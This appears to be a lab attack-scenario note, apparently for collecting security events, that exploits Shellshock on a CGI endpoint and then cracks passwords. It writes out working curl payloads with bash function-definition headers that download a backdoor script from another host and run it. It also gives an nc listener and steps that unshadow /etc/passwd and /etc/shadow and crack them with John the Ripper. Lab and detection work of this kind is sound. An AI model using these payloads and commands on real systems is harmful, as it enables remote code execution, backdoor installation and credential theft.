# Shellshock + John the ripper

** Description ** Attacker exploits remote shellshock vulnerability by sending crafted input to CGI service implemented using bash.

## Openning reverse shell with Shellshock vulnerability

* Leveraging ShellShock vulnerability 

## Rassword cracker 

* http://www.syssec.org:9000/xlIOo/john.tar.xz



## Attack steps

1. Log into `wlab2-lin1`, target host is `wlab2-lin0`.

    * We only collect events from `wlab2-lin0` (victim host)

2. Run nc backdoor from wlab2-lin1 

```
while true
do
    nc -l -p 9999
done
```

3. Exploit Shellshock vulnerability

  * Download backdoor script
```
curl -H "user-agent: () { :; }; echo; echo; curl http://172.16.67.131/tools/bdoor.sh -o /tmp/t" http://172.16.67.130:8080/cgi-bin/env.cgi
```
  * Run backdoor script
```
curl -H "user-agent: () { :; }; echo; echo; bash /tmp/bdoor.sh" http://172.16.67.130:8080/cgi-bin/env.cgi
```

4. From backdoor session, run the John-the-ripper package.

* [John the ripper examples](https://www.openwall.com/john/doc/EXAMPLES.shtml)

```
$ cd /tmp/
$ wget http://www.syssec.org:9000/xlIOo/john.tar.xz
$ tar xvf john.tar.xz
$ cd john
$ sudo unshadow /etc/passwd /etc/shadow > myshadow
$ ./john myshadow
...
Proceeding with wordlist:./password.lst, rules:Wordlist
Abc12345         (victim0)
```

## Regular operation

```bash
curl http://172.16.67.130:8080/cgi-bin/env.cgi
```

## Resources

* Need a Linux host (wlab-lin0)

* Apache webserver (or thttpd) + CGI script

* Prepare dummy user
```
$ sudo adduser victim0
...    
# Type-in 'Abc12345' as a password
Enter new UNIX password:   
Retype new UNIX password:
```

## Track CURL in
```
/usr/bin/curl /usr/share/man/man1/curl.1.gz
```

###### tags: `john`,`ripper`,`linux`,`attack`,`shellshock`